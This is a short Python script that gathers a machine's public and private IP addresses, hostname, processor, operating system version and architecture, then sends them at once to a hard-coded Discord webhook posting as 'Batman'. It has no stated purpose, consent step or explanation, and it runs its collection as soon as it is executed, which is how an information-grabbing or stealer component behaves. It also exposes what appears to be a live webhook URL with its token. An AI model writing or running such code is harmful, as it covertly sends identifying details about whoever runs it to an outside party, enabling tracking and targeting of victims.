from discord_webhook import DiscordWebhook, DiscordEmbed
import socket
import platform
from requests import get
from time import sleep



def create_webhook():
    return DiscordWebhook(url='https://discord.com/api/webhooks/1179897294024360089/UIdyF0OYWNEbnMM4slmmJFyi67j8ritXSdqExYjT2tRyYUWn1MAh3-MK0Msr3UEZ5s7Q', username="Batman")

def computer_information(webhook):
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    try:
        public_ip = get("https://api.ipify.org").text
        embed = DiscordEmbed(title="Public IP Address: " + public_ip, color=123123)
        webhook.add_embed(embed)
    except Exception:
        embed = DiscordEmbed(title="Couldn't get Public IP Address")
        webhook.add_embed(embed)

    embed = DiscordEmbed(description="Processor: " + (platform.processor()) + '\n')
    webhook.add_embed(embed)
    embed = DiscordEmbed(description="System: " + platform.system() + " " + platform.version() + '\n')
    webhook.add_embed(embed)
    embed = DiscordEmbed(description="Machine: " + platform.machine() + "\n")
    webhook.add_embed(embed)
    embed = DiscordEmbed(description="Hostname: " + hostname + "\n")
    webhook.add_embed(embed)
    embed = DiscordEmbed(description="Private IP Address: " + IPAddr + "\n")
    webhook.add_embed(embed)
    webhook.execute()
webhook = create_webhook()
computer_information(webhook)